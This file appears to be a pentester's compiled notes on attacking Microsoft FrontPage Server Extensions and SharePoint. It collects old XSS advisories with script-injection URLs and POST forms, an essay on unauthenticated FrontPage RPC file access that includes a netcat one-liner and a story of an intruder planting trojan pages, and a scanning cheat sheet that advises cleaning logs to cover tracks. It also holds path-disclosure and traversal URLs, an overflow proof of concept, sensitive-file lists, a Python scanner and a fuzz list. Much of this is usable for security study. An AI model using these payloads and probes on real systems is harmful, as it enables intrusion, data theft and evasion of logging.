@@ -1,0 +1,1035 @@
+Microsoft FrontPage was phased out in 2013, but there are many website builders available. Learn more about website builders you can use instead of Microsoft FrontPage.
+
+
+#######################################################################
+
+Georgi Guninski security advisory #19, 2000
+IIS 5.0 cross site scripting vulnerability - using .shtml files or /_vti_bin/shtml.dll
+
+This advisory describes two vulnerabilites (one is already fixed by Microsoft) but I decided to put them together.
+
+Systems affected: 
+IIS 5.0/Windows 2000. Exploited with browser (IE,NC) but the problem is in the web server. 
+For the /_vti_bin/shtml.dll vulnerability FrontPage server extensions must be installed, but FrontPage Service Release 1.2 fixes the bug. 
+Probably other versions OSes - have not tested. IIS 4.0 is reported to be vulnerable 
+ 
+
+Risk: Medium 
+Date: 21 August 2000
+
+Legal Notice: 
+This Advisory is Copyright (c) 2000 Georgi Guninski. You may distribute it unmodified. You may not modify it and distribute it or distribute parts of it without the author's written permission.
+
+Disclaimer: 
+The opinions expressed in this advisory and program are my own and not of any company. 
+The usual standard disclaimer applies, especially the fact that Georgi Guninski is not liable for any damages caused by direct or  indirect use of the information or functionality provided by this program. 
+Georgi Guninski, bears NO responsibility for content or misuse of this program or any derivatives thereof. 
+ 
+
+Description: 
+Using specially designed URLs, IIS 5.0 may return user specified content to the browser. 
+This poses great security risk, especially if the browser is JavaScript enabled and the problem is greater in IE. 
+By clicking on links or just visiting hostile web pages the target IIS sever may return user defined malicous active content. 
+This is a bug in IIS 5.0, but it affects end users and is exploited with a browser. 
+Issues: 
+1) .shtml files - specially designed urls involving .shtml files may return hostile content 
+2) /_vti_bin/shtml.dll - specially designed urls may return hostile content (this issue is already fixed by Microsoft) 
+  
+ 
+
+Details:
+
+Both issues takes advantage of an unescaped error message return by IIS or FrontPage Extensions.
+
+1) 
+The following URL: 
+--------------------------- 
+http://iis5server/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT>.shtml 
+--------------------------- 
+executes in the browser javascript provided by "iis5server" but defined by a (malicous) user. 
+The URL may be used in a link or a script. 
+2) The following URL: 
+--------------------------- 
+http://iis5server/_vti_bin/shtml.dll/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT> 
+--------------------------- 
+executes in the browser javascript provided by "iis5server" but defined by a (malicous) user. 
+The URL may be used in a link or a script. 
+ 
+
+The cross site scripting issue is known since long time, it had great publicity in February 2000. 
+For information of the general problem, see the following documents:
+
+CERT® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests: 
+http://www.cert.org/advisories/CA-2000-02.html
+
+Cross-site Scripting Overview (by Microsoft): 
+http://microsoft.com/technet/security/CSOverv.asp
+
+Some malicous things that be done with this vulnerability in web sites running IIS, assuming JavaScript is enabled in the browser: 
+1) Reading the documents on web servers inside a firewall (in the intranet). 
+2) Stealing cookies - great danger. 
+3) For IE: if the user has put a web site in the "Trusted sites" zones, other browser attacks may be launched. 
+4) Others.
+
+At the time of writing this www.microsoft.com is vulnerable to issue 1. 
+Demonstration is available at: (note: I believe Microsoft shall fix this very soon and the demo shall stop working): 
+http://www.guninski.com/iisshtml.html
+
+Solution: Issue 2 is fixed by Microsoft with Frontpage Server Extensions Service Release 1.2 available for download from http://msdn.microsoft.com
+
+#######################################################################
+
+Using specially designed URLs, IIS 5.0 may return user specified content to the browser. This poses great security risk, especially if the browser is JavaScript enabled and the problem is even greater in IE. By clicking on links or just visiting hostile web pages the target IIS sever may return malicious active content. This is a bug in IIS 5.0, but it affects end users and is exploited with a browser.
+
+Issues:
+1) .shtml files - specially designed URLs involving .shtml files may return hostile content.
+2) /_vti_bin/shtml.dll - specially designed URLs may return hostile content (this issue is already fixed by Microsoft).
+
+Details:
+Both issues take advantage of an un-escaped error message returned by IIS or FrontPage Extensions.
+
+1) The following URL:
+http://iis5server.example.com/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT>.shtml
+
+Executes javascript in the browser. The script is provided by "iis5server", but is actually defined by an attacker.
+
+The URL may be used in a link or a script.
+2) The following URL:
+
+http://iis5server.example.com/_vti_bin/shtml.dll/<SCRIPT>alert('document.domain='+document.domain)</SCRIPT>
+
+Does the same exploit. The URL may be used in a link or a script.
+
+The cross-site scripting issue had been known for quite a long time. For more information about the general problem, see the following documents:
+Security concerns when developing a dynamically generated web site
+
+Cross-site Scripting Overview (by Microsoft):
+http://microsoft.com/technet/security/CSOverv.asp
+
+Some attacks that be performed using this vulnerability in web sites running IIS, assuming JavaScript is enabled in the browser:
+1) Reading the documents on web servers inside a firewall (in the Intranet).
+2) Stealing cookies (poses great danger to sensitive information).
+3) For IE: if the user has put a web site in the "Trusted sites" zones, other browser attacks may be launched.
+
+#######################################################################
+
+Change MirrorDownload
+If you have installed Microsoft Office 2000 or keep current on your Windows 
+Updates, you may have noticed a new WebFolders namespace in Windows Explorer.  
+WebFolders are a new concept designed to give Microsoft Office and FrontPage 
+users the ability to publish and work with web content.  The concept is that a 
+web site becomes a part of Windows Explorer so that you can work with web 
+content as if it were located locally or on a network drive.
+
+The fun part is that WebFolders have some significant weaknesses (inherited from 
+FrontPage) and are such a new concept that it turns out they make a great entry 
+point into a remote server.  In fact, when you connect to a web folder you are 
+doing exactly the same thing that FrontPage does when it connects to a remote 
+web site.  This vulnerability is nothing new and I doubt there will be any 
+patches forthcoming because it mainly exploits ignorance and smugness more than 
+server applications. Okay, so this is really about FrontPage and for some of you 
+this may just be a review.  Nonetheless, I am surprised how few people seem to 
+understand how FrontPage security works.  
+
+USING WEBFOLDERS
+
+As I mentioned previously, WebFolders work the same as FrontPage when connecting 
+to web sites.  Essentially when you add a new WebFolder, Explorer will send a 
+Post request to /_vti_bin/_vti_aut/author.dll (among others), which is installed 
+as a part of the FrontPage Server extensions.  So when you are using WebFolders, 
+you are really just using the FrontPage Server extensions.  If as an anonymous 
+user you do not have read and execute access to that file, the server try to get 
+an NTLM or Basic authentication from you.  If any of those credentials succeed, 
+you will now have a new WebFolder mapped to the remote server's web root.  Even 
+better, if you are able to get to this point, you should have at least authoring 
+rights on the server, which means that you will be able to do just about 
+anything you want on this web site. And when this is used in combination with 
+other known exploits, one can easily achieve full admin access to a server.
+
+Before getting into the technical details, lets look at what this all means and 
+some of the issues involved here:
+
+1.  Someone can remotely access at least a portion of your file system, 
+    including read, write, and execute permissions;
+2.  Since it all works on port 80, this exploit could easily work through many 
+    firewalls configurations and intrusion detection systems;
+3.  Since all file access is done through posts to author.dll, the specific 
+    files accessed will not show up in any logs and therefore you won't really 
+    know how much the attacker really did or what files he accessed (or 
+    installed);
+4.  The exploit can easily be performed through proxy servers to more easily 
+    disguise the originating IP address;
+5.  The login prompt is a good place to perform a brute-force attack (whether it 
+    shows up in the Event Log or triggers account lockouts, I have not yet 
+    tested).  Another related fact is that in order to connect to a WebFolder, 
+    FrontPage requires that the author's account have the ability to log on 
+    locally.  So if you do connect to a WebFolder you will be locally logged on 
+    to that server (something to think about);
+6.  The permissions you have as the web author will normally be greater than 
+    those given to IUSR_MACHINE;
+7.  Passwords are often stored in global.asa and other files which may be used 
+    to attack other servers;
+8.  Most people do not realize that they are vulnerable since a default 
+    FrontPage installation does not implement any security restrictions and many 
+    people do not understand how to setup FrontPage security.
+
+HOW IT ALL WORKS
+
+On Windows NT and IIS, FrontPage security is basically controlled by the access 
+rights to the three files Admin.dll, Author.dll, and Shtml.dll.  These rights 
+respectively determine administration, authoring, and browsing rights.  For 
+example, if a remote user is able to read and execute Admin.dll, then that user 
+is able to administer the web site.
+
+The authentication dll's are structured as follows:
+
+Web Root
+    \_vti_bin
+     shtml.dll
+         \_vti_aut
+          author.dll
+         \_vti_adm
+          admin.dll
+ 
+When the post to author.dll succeeds, the client will then be able to browse the 
+web site as if it were browsing the file system.  And since an author has full 
+authoring capabilities, he can also do things such as place executable files in 
+the _vti_bin directory or other executable directories.  Having user read, 
+write, and execute access is just one step away from having full admin access.
+
+Properly called the FrontPage Remote Procedure Call Protocol, the exact 
+procedure for connecting is as follows:
+
+First, Explorer sends the remote server an OPTIONS / HTTP/1.1 (I suppose to 
+figure out if it can post).  At this point it is sending a User-Agent of 
+"Microsoft Data Access Internet Publishing Provider Cache Manager", although in 
+later requests it sends a User-Agent of "MSFrontPage/4.0."  So far I have seen 
+few servers that dissallow the POST method so this usually succeeds (which makes 
+me wonder why they even do it).
+
+Then it sends GET /_vti_inf.html HTTP/1.1.  This is the basic configuration file 
+for the FrontPage extensions.  This tells Explorer that the FrontPage server 
+extensions are installed and it looks for the line 
+FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll".  On IIS it will be author.dll 
+and on all others it will be author.exe.  Of course, if the file isn't there, we 
+get a 404 and we know this server doesn't have FrontPage support.
+
+After it knows the location of the authoring binaries, it sends POST 
+/_vti_bin/shtml.dll/_vti_rpc HTTP/1.1.  Shtml.dll is the browse binary and is 
+available to everyone.  The post data is: 
+method=server+version%3a4%2e0%2e2%2e2611, to which the server responds something 
+like this:
+<html><head><title>vermeer RPC packet</title></head>
+<body>
+<p>method=server version:3.0.2.1706
+<p>server version=
+<ul>
+<li>major ver=3
+<li>minor ver=0
+<li>phase ver=2
+<li>ver incr=1706
+</ul>
+<p>source control=0
+</body>
+</html>
+
+Now Explorer knows the version (although it could have extracted this from the 
+_vti_inf.html file) and can start its work.  It sends a POST to 
+/_vti_bin/_vti_aut/author.dll, which is the authoring binary.  The post data is 
+method=open+service%3a3%2e0%2e2%2e1706&service%5fname=%2f (notice how it now 
+uses the server's version). This is where the authentication comes in.  If the 
+ACL of author.dll permits this request, the server responds with a bunch of 
+settings, which is basically the /_vti_pvt/services.cnf file.  There is nothing 
+very interesting here, although some of the information could be used along with 
+other exploits.  The good part comes in this next request:
+
+POST /_vti_bin/_vti_aut/author.dll HTTP/1.1
+MIME-Version: 1.0
+User-Agent: MSFrontPage/4.0
+Accept: auth/sicily
+Content-Length: 241
+Content-Type: application/x-www-form-urlencoded
+X-Vermeer-Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+
+method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=false&li
+stExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkI
+nfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl
+=
+
+This is where we get the good stuff.  Of course as you can see, Explorer is 
+being pretty nice (notice also the version number in the request).  What we 
+really want to do is change some of those settings like listHiddenDocs=True and 
+listExplorerDocs=True and listLinkInfo=True and listIncludeParent=true.  And of 
+course, to browse other directories, you change the initialURL value (i.e., 
+initialUrl=cgi%2dbin). 
+
+To retreive a file, you send this as the POST data:
+method=get+document%3a3%2e0%2e2%2e1105&service%5fname=&document%5fname=about%2fd
+efault%2ehtm&old%5ftheme%5fhtml=false&force=true&get%5foption=none&doc%5fversion
+=
+
+In all I have found many commands you can send.  I haven't tested them nor do I 
+know their exact parameters and I'm not sure if they can all be used remotely, 
+but there is certainly much room for exploring.  And some commands are limited 
+to admins while others are available to authors as well.  In fact, some commands 
+are available to everyone.  Thats how FrontPage is able to list subwebs of a 
+site without logging in.
+
+FRONT PAGE SECURITY
+
+Unfortunately, when you install the FrontPage server extensions, there are no 
+security limitations implemented.  And it is very easy to get confused because 
+the whole thing is based on the ACLs of a few files.  It would be very easy even 
+for even an experienced admin to overlook FrontPage security.  Imagine this 
+scenario:
+
+A company is using FrontPage to author their public web site.  Their web server 
+is considered very secure and the administrator has taken many steps to keep 
+hackers out.  The network firewall restrictions are very tight, so that web and 
+FTP access is all that anyone gets.  The administrator knows that the FrontPage 
+server extensions aren't as strong as they should be so he has the web developer 
+author the web site on his own Windows 98 computer then use FTP to upload to the 
+server.  The web developer has installed the personal web server that comes with 
+FrontPage so that he has his own local copy of the web that he uses for 
+development.  His computer is on the internal network and is not exposed to the 
+internet.  In fact, it is nowhere near the internet since it is in his office 
+which is across the building from the server.
+
+Then along comes a hacker that is trying to break in to their web site.  He sees 
+that main web server is very secure so he does a zone transfer for that company 
+and finds they own a whole class c network.  He scans the internal network but 
+his pings fail and it appears that a firewall is in place.  He then scans their 
+network for port 80 and sees that it isn't being filtered.  In fact, he has 
+located several ports open, one on a seemingly insignificant box.  He types that 
+address into his browser and finds that it seems to be a mirror of their main 
+site.  But then he tries to create a WebFolder with that address and it 
+immediately connects without even prompting for a password.  He starts his work, 
+grabbing global.asa to get their SQL Server password, installing a few trojan 
+ASP pages, one which allows querying the SQL Server database and then the usual 
+cmd.exe, nc.exe, getadmin.exe, and/or perl.exe executables.  About an hour later 
+he has everything he wants (whatever that may be) as well as a few extras, such 
+as this company's login to the Microsoft's Solution Partner area and some porn 
+he found in the developer's internet cache.  When he's done, he deletes his 
+files and doesn't even bother with logs since it's not even logging (why should 
+it, its just a development system?).  He does leave in one inconspicious trojan 
+ASP page hoping that it will eventually make its way to the main web server then 
+he closes the WebFolder and he's done.
+
+Sure, some of you may say that this vulnerability is dependent upon some 
+misconfigurations and oversights but unfortunately (or fortunately, depending on 
+who you are) these misconfigurations and oversights are way too common.  If 
+FrontPage doesn't prompt you for a password when you open your site, it won't be 
+prompting anyone else either.  And what if someone just installed FrontPage to 
+check it out but never used it?  This site will still be vulnerable even though 
+they may have never created a FrontPage web.  Or what if the web author gets 
+sick of entering a password each time he connects so just sets his password 
+blank?  The sad fact is that as long as there are passwords, there will always 
+be bad passwords.  How secure is that copy of FrontPage you run on your own 
+system?  Have you checked?
+
+To test a site, you can either open it in FrontPage, add it as a WebFolder, or 
+here's another way:
+
+Create a file named listdocuments that contains the following (you will want to 
+change the host):
+
+POST /_vti_bin/_vti_aut/author.dll HTTP/1.1
+MIME-Version: 1.0
+Accept: auth/sicily
+Content-Length: 219
+Host: www.yourhosthere.com
+Content-Type: application/x-www-form-urlencoded
+X-Vermeer-Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+
+method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&lis
+tExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInf
+o=false&listIncludeParent=true&listDerived=false&listBorders=false
+
+Then using NetCat, do something like this:
+
+nc -v www.targethost.com 80 < listdocuments
+
+Another interesting point is that since FrontPage security is based on ACLs 
+those three FrontPage dll files, a file system such as FAT that doesn't have 
+ACLs will be completely open to WebFolder connections no matter what you do.
+
+Another thing I would like to point out is that since WebFolders and FrontPage 
+connect to sites the same way, you could also use the FrontPage Explorer to 
+connect to a site.  The benefit of using the FrontPage Explorer is that you can 
+also change permissions on files and view hidden directories and files.  Another 
+interesting point is that ADO 2.5 provides OLE DB access to web folders so it 
+would be very easy to write a script or application that will scan networks for 
+vulnerable servers.  And of course you could also use any Office 2000 
+application and VBA to connect to remote servers.  Finally, interactive and 
+network accounts can list the directories (rx) of the web root.  This is so that 
+the FrontPage Explorer can list the sub webs.  If you use FrontPage Explorer to 
+connect to a web site, you will be given a list of sub webs to connect to as 
+well.  This can be done by anyone without any authentication
+
+Given some thought, one could take these concepts a lot farther.  Here are some 
+other concepts to ponder:
+
+1.  Administrators are always given full admin access to FrontPage webs so 
+    that may be a good user to use in a brute-force attack;
+2.  FrontPage has executable access to many system dll's including 
+    msvcrt40.dll, netapi32.dll, rpcltcl.dll, samlib.dll, and wsock32.dll;
+3.  If IIS is set to run dll's in-process, then one could replace the 
+    FrontPage dll's with a trojan.  These dll's do not even have to be in the 
+    same location, just named the same;
+4.  A user's local login and password may be sent to the server using basic 
+    authentication without the user knowing it
+
+The FrontPage is a wonderful world full of unexplored exploits and 
+vulnerabilities.  Its a shame more time hasn't been spent exploring this more.  
+It also goes to show that the more we try to close doors, the more software 
+vendors open up new ones.  Forget BO2k and NetBus, Microsoft did a much better 
+job.
+#######################################################################
+
+http://www.securityfocus.com/bid/17452/info
+ 
+Microsoft FrontPage Server Extensions are prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before it is rendered to other users. 
+ 
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user, with the privileges of the victim userâ??s account. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+ 
+<form action=http://www.example.com/_vti_bin/_vti_adm/fpadmdll.dll method="POST">
+<input type="hidden" name="operation" value="--><script>alert()</script>">
+<input type="hidden" name="action" value="none">
+<input type="hidden" name="port" value="/LM/W3SVC/1:">
+<input type="submit" name="page" value="healthrp.htm">
+</form>
+
+#######################################################################
+
+Argeniss Security Advisory
+
+
+Name:  Vulnerability in Microsoft FrontPage Server Extensions Could Allow 
+Cross-Site Scripting (MS06-17)
+Affected Software:  Microsoft FrontPage Server Extensions 2002 and Microsoft 
+SharePoint Team Services
+Severity:  Medium
+Remote exploitable:  Yes (User intervention required)
+Credits:  Esteban Martínez Fayó
+Date:  4/11/2006
+Advisory Number:  ARG040602
+
+
+Details:
+The FrontPage Server Extensions 2002 (included in Windows Sever 2003 IIS 6.0 
+and available as a separate download for Windows 2000 and XP) has a web page 
+/_vti_bin/_vti_adm/fpadmdll.dll that is used for administrative purposes.
+This web page is vulnerable to cross site scripting attacks allowing an 
+attacker to run client-side script on behalf of an FPSE user. If the victim 
+is an administrator, the attacker could take complete control of a Front 
+Page Server Extensions 2002 server.
+
+To exploit the vulnerability an attacker can send a specially crafted e-mail 
+message to a FPSE user and then persuade the user to click a link in the 
+e-mail message.
+In addition, this vulnerability can be exploited if an attacker hosts a 
+malicious website and persuade the user to visit it.
+
+The vulnerable parameters of fpadmdll.dll are "operation", "command", and 
+"name". These parameters appears in the output without properly sanitization 
+in an HTML comment but it can be escaped with a '-->'.
+
+Exploit Examples:
+
+An attacker could create a FORM that POST to the FPSE server and executes a 
+script on the client system.
+<form action=http://iisserver/_vti_bin/_vti_adm/fpadmdll.dll method="POST">
+<input type="hidden" name="operation" value="--><script>alert()</script>">
+<input type="hidden" name="action" value="none">
+<input type="hidden" name="port" value="/LM/W3SVC/1:">
+<input type="submit" name="page" value="healthrp.htm">
+</form>
+
+Also, an attacker could inject an image from another web site that he has 
+control over and if it has HTTP authentication could convince the user to 
+enter its credentials and capture it.
+<form action=http://iisserver/_vti_bin/_vti_adm/fpadmdll.dll method="POST">
+<input type="hidden" name="operation" value="--><img 
+src=http://hackersite/image.jpg>">
+<input type="hidden" name="action" value="none">
+<input type="hidden" name="port" value="/LM/W3SVC/1:">
+<input type="submit" name="page" value="healthrp.htm">
+</form>
+
+
+Vendor Status:
+Vendor was contacted and a patch was released.
+
+
+Patch Available:
+Apply patch MS06-017.
+
+
+Links:
+http://www.argeniss.com/research/ARGENISS-ADV-040602.txt
+http://www.microsoft.com/technet/security/Bulletin/MS06-017.mspx
+
+
+Spam:
+Argeniss Ultimate 0day Exploits Pack
+#######################################################################
+
+NOTE: Name and password are case sensitive
+Scanning PORT 80 or 443 options:
+
+GET /_vti_inf.html                 #Ensures that frontpage server extensions
+                                    are installed. 
+GET /_vti_pvt/service.pwd          #Contains the encrypted password files.
+                                    Not used on IIS and WebSite servers
+GET /_vti_pvt/authors.pwd          #On Netscape servers only. Encrypted
+                                    names and passwords of authors.
+GET /_vti_pvt/administrators.pwd
+GET /_vti_log/author.log           #If author.log is there it will need to
+                                    be cleaned to cover your tracks
+
+
+
+C:\InetPub\wwwroot                               <Home>
+C:\InetPub\scripts                               /Scripts
+C:\InetPub\wwwroot\_vti_bin                      /_vti_bin
+C:\InetPub\wwwroot\_vti_bin\_vti_adm             /_vti_bin/_vti_adm
+C:\InetPub\wwwroot\_vti_bin\_vti_aut             /_vti_bin/_vti_aut
+C:\InetPub\cgi-bin                               /cgi-bin
+C:\InetPub\wwwroot\srchadm                       /srchadm
+C:\WINNT\System32\inetserv\iisadmin              /iisadmin
+C:\InetPub\wwwroot\_vti_pvt               
+C:\InetPub\wwwroot\samples\Search\QUERYHIT.HTM   Internet Information Index Server sample
+C:\Program Files\Microsoft FrontPage\_vti_bin
+C:\Program Files\Microsoft FrontPage\_vti_bin\_vti_aut
+C:\Program Files\Microsoft FrontPage\_vti_bin\_vti_adm
+C:\WINNT\System32\inetserv\iisadmin\htmldocs\admin.htm  /iisadmin/isadmin
+
+
+The authentication dll's are structured as follows:
+
+Web Root
+    \_vti_bin
+     shtml.dll
+         \_vti_aut
+          author.dll
+         \_vti_adm
+          admin.dll
+
+
+
+#######################################################################
+
+Argeniss Security Advisory
+
+
+Name:  Vulnerability in Microsoft FrontPage Server Extensions Could Allow 
+Cross-Site Scripting (MS06-17)
+Affected Software:  Microsoft FrontPage Server Extensions 2002 and Microsoft 
+SharePoint Team Services
+Severity:  Medium
+Remote exploitable:  Yes (User intervention required)
+Credits:  Esteban Martínez Fayó
+Date:  4/11/2006
+Advisory Number:  ARG040602
+
+
+Details:
+The FrontPage Server Extensions 2002 (included in Windows Sever 2003 IIS 6.0 
+and available as a separate download for Windows 2000 and XP) has a web page 
+/_vti_bin/_vti_adm/fpadmdll.dll that is used for administrative purposes.
+This web page is vulnerable to cross site scripting attacks allowing an 
+attacker to run client-side script on behalf of an FPSE user. If the victim 
+is an administrator, the attacker could take complete control of a Front 
+Page Server Extensions 2002 server.
+
+To exploit the vulnerability an attacker can send a specially crafted e-mail 
+message to a FPSE user and then persuade the user to click a link in the 
+e-mail message.
+In addition, this vulnerability can be exploited if an attacker hosts a 
+malicious website and persuade the user to visit it.
+
+The vulnerable parameters of fpadmdll.dll are "operation", "command", and 
+"name". These parameters appears in the output without properly sanitization 
+in an HTML comment but it can be escaped with a '-->'.
+
+Exploit Examples:
+
+An attacker could create a FORM that POST to the FPSE server and executes a 
+script on the client system.
+<form action=http://iisserver/_vti_bin/_vti_adm/fpadmdll.dll method="POST">
+<input type="hidden" name="operation" value="--><script>alert()</script>">
+<input type="hidden" name="action" value="none">
+<input type="hidden" name="port" value="/LM/W3SVC/1:">
+<input type="submit" name="page" value="healthrp.htm">
+</form>
+
+Also, an attacker could inject an image from another web site that he has 
+control over and if it has HTTP authentication could convince the user to 
+enter its credentials and capture it.
+<form action=http://iisserver/_vti_bin/_vti_adm/fpadmdll.dll method="POST">
+<input type="hidden" name="operation" value="--><img 
+src=http://hackersite/image.jpg>">
+<input type="hidden" name="action" value="none">
+<input type="hidden" name="port" value="/LM/W3SVC/1:">
+<input type="submit" name="page" value="healthrp.htm">
+</form>
+
+
+#######################################################################
+
+Microsoft Frontpage Server Extensions Path Disclosure Vulnerability
+
+Bugtraq ID: 	1174
+Class: 	Design Error
+CVE: 	CVE-2000-0413
+Remote: 	Yes
+Local: 	Yes
+Published: 	May 06 2000 12:00AM
+Updated: 	Jul 11 2009 01:56AM
+Credit: 	Posted to Bugtraq on May 6, 2000 by Frankie Zie <root@cnns.net>.
+Vulnerable: 	Microsoft IIS 5.0
+
+Microsoft Frontpage Server Extensions Path Disclosure Vulnerability
+
+http://target/_vti_bin/shtml.exe/non-existent-file.html
+http://target/_vti_bin/shtml.exe/non-existent-file.htm
+http://target/_vti_bin/shtml.exe/non-existent-file.shtml
+http://target/_vti_bin/shtml.exe/non-existent-file.asp
+http://target/_vti_bin/shtml.dll/non_existant_file.html 
+
+#######################################################################
+
+ Microsoft FrontPage Server Extensions Remote Debug Buffer Overrun Vulnerability
+
+CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.
+
+The researcher who discovered this vulnerability has developed working exploit code which is not publicly available or known to be circulating in the wild. The following proof-of-concept example was also provided:
+
+POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1
+Transfer-Encoding: chunked
+
+PostLength
+PostData
+0
+
+An exploit (fp30reg.c) has been developed and made available by Adik and is available below.
+
+    /data/vulnerabilities/exploits/fp30reg.c
+
+
+
+#######################################################################
+
+Bugtraq ID: 	989
+Class: 	Input Validation Error
+CVE: 	CVE-2000-0153
+CVE-1999-0386
+Remote: 	Yes
+Local: 	Yes
+Published: 	Jan 17 1996 12:00AM
+Updated: 	Jul 11 2009 01:56AM
+Credit: 	Originally posted to Bugtraq on January 17, 1996 by kiborg <contact@kiborg.net>.
+Vulnerable: 	Microsoft Personal Web Server 4.0
++ Microsoft NT Option Pack for NT 4.0 0
++ Microsoft NT Option Pack for NT 4.0 0
++ Microsoft Windows 98
++ Microsoft Windows 98
+Microsoft FrontPage Personal WebServer 1.0
++ Microsoft FrontPage 1.1
++ Microsoft FrontPage 1.1
++ Microsoft FrontPage 97
++ Microsoft FrontPage 97
++ Microsoft FrontPage 98
++ Microsoft FrontPage 98 
+
+Microsoft FrontPage PWS Directory Traversal Vulnerability
+
+http://target/..../directory/filename.ext 
+
+#######################################################################
+
+FrontPage Server Extensions Accessible
+		
+/_vti_pvt/access.cnf 
+/_vti_pvt/botinfs.cnf 
+/_vti_pvt/bots.cnf 
+/_vti_pvt/service.cnf 
+/_vti_pvt/services.cnf 
+/_vti_pvt/writeto.cnf 
+/_vti_pvt/linkinfo.cnf 
+/postinfo.html 
+/orders/ 
+/status/ 
+/temp/ 
+/test.html 
+/web/ 
+/scripts/ 
+/_private/ 
+/_private/form_results.txt 
+/tn/	
+/_private/_vti_cnf/ 
+/_vti_bin/_vti_cnf/ 
+/_vti_log/_vti_cnf/ 
+/_vti_pvt/ 
+/_vti_txt/_vti_cnf/ 
+/_private/_vti_cnf/ 
+/_vti_bin/ 
+/_vti_bin/_vti_cnf/ 
+/_vti_log/_vti_cnf/ 
+/_vti_pvt/ 
+/_vti_txt/_vti_cnf/ 
+/_private/_vti_cnf/ 
+/_vti_bin/_vti_cnf/ 
+/_vti_log/_vti_cnf/
+/_vti_pvt/ 
+/_vti_txt/_vti_cnf/ 
+/service.cnf. 
+/postinfo.html 
+/test.htm 
+/_vti_inf.html 
+/_vti_pvt/deptodoc.btr 
+/_vti_pvt/ doctodep.btr 
+/_vti_pvt/access.cnf 
+/_vti_pvt/botinfs.cnf 
+/_vti_pvt/bots.cnf 
+/postinfo.html 
+/_vti_pvt/_x_todoh.htm 
+/postinfo.html 
+/_vti_pvt/_x_todoh.htm 
+/postinfo.html 
+/_vti_pvt/_x_todoh.htm 
+/postinfo.html 
+/_vti_pvt/_x_todoh.htm 
+
+
+#######################################################################
+https://webcache.googleusercontent.com/search?q=cache:19gstY0Xj4AJ:https://ipsec.pl/files/ipsec/frontpage.py__0.txt+&cd=1&hl=en&ct=clnk&gl=au
+
+
+#!/usr/bin/python
+
+# http://packetstormsecurity.com/files/11652/webfolders.txt.html
+
+import requests
+import sys
+
+if len(sys.argv) < 2:
+    print('Usage: frontpage.py URL')
+    exit()
+
+target = sys.argv[1]
+
+VTI_INF = '/_vti_inf.html'
+SERVICE_CNF = '/_vti_pvt/service.cnf'
+
+list_documents = {
+        'method' : 'list documents:VERSION',
+        'service_name' : '',
+        'listHiddenDocs' : 'true',
+        'listExplorerDocs' : 'true',
+        'listRecurse' : 'false',
+        'listFiles' : 'true',
+        'listFolders' : 'true',
+        'listLinkInfo' : 'false',
+        'listIncludeParent' : 'true',
+        'listDerived' : 'false',
+        'listBorders' : 'false'
+        }
+server_version = {'method':'server version:VERSION'}
+open_service = {'method':'open service:VERSION', 'service_name':'/'}
+
+sequence = [
+        ('/_vti_bin/shtml.dll/_vti_rpc',  server_version ),
+        ('/_vti_bin/_vti_aut/author.dll', open_service ),
+        ('/_vti_bin/_vti_aut/author.dll', list_documents),
+        #('/Pages/_vti_bin/_vti_adm/admin.dll', ''),
+        #('/_vti_bin/_vti_adm/admin.dll', ''),
+        ]
+
+headers = {
+        'mime-version' : '1.0',
+        'user-agent' : 'Microsoft Data Access Internet Publishing Provider Cache Manager',
+        'accept' : 'auth/sicily',
+        'x-vermeer-content-type' : 'application/x-www-form-urlencoded'
+        }
+
+r = requests.get(target + VTI_INF)
+if not r.ok:
+    print('{0} not found - it\'s not FrontPage'.format(VTI_INF))
+else:
+    print('{0} - FrontPage Server Extensions found'.format(VTI_INF))
+
+r = requests.get(target + SERVICE_CNF)
+if not r.ok:
+    print('{0} not found - it\'s not SharePoint'.format(SERVICE_CNF))
+    exit()
+else:
+    print('{0} - it\'s SharePoint'.format(SERVICE_CNF))
+
+    import re
+
+    m = re.search('vti_extenderversion:SR\|([0-9\.]+)', r.text)
+    if not m:
+        print('Cannot parse SharePoint version from headers')
+    else:
+
+        ver = m.group(1)
+
+        print('Version response: {0}'.format(ver))
+
+        for url,data in sequence:
+            # replace version template
+            method = data['method']
+            method = method.replace('VERSION', m.group(1))
+            data['method'] = method
+            # check
+            r = requests.post('{0}{1}'.format(target,url), headers=headers, data=data)
+            if r.ok:
+                print('WARNING: {0} {1} is open'.format(url, data['method']))
+            else:
+                print('{0} {1} is blocked - OK'.format(url, data['method']))
+
+#######################################################################
+
+https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
+
+>> https://github.com/alienwithin/Scripts-Sploits/blob/master/giveWebHead.py
+
+
+VERY usefull
+
+
+https://github.com/XalfiE/Sharepoint-URL-Fuzzlist/blob/master/sharepoint.txt
+
+_vti_inf.html
+_vti_bin/spdisco.aspx
+_layouts/userdisp.aspx?Force=True&id=1
+_layouts/userdisp.aspx?Force=True&id=2
+_layouts/userdisp.aspx?Force=True&id=3
+_layouts/userdisp.aspx?Force=True&id=4
+_layouts/userdisp.aspx?Force=True&id=5
+_layouts/userdisp.aspx?Force=True&id=6
+_layouts/userdisp.aspx?Force=True&id=7
+_layouts/userdisp.aspx?Force=True&id=8
+_layouts/userdisp.aspx?Force=True&id=9
+_layouts/userdisp.aspx?Force=True&id=10
+_layouts/userdisp.aspx?Force=True&id=11
+_layouts/userdisp.aspx?Force=True&id=12
+_layouts/userdisp.aspx?Force=True&id=13
+_layouts/userdisp.aspx?Force=True&id=14
+_layouts/userdisp.aspx?Force=True&id=15
+_layouts/userdisp.aspx?Force=True&id=16
+_layouts/userdisp.aspx?Force=True&id=17
+_layouts/userdisp.aspx?Force=True&id=18
+_layouts/userdisp.aspx?Force=True&id=19
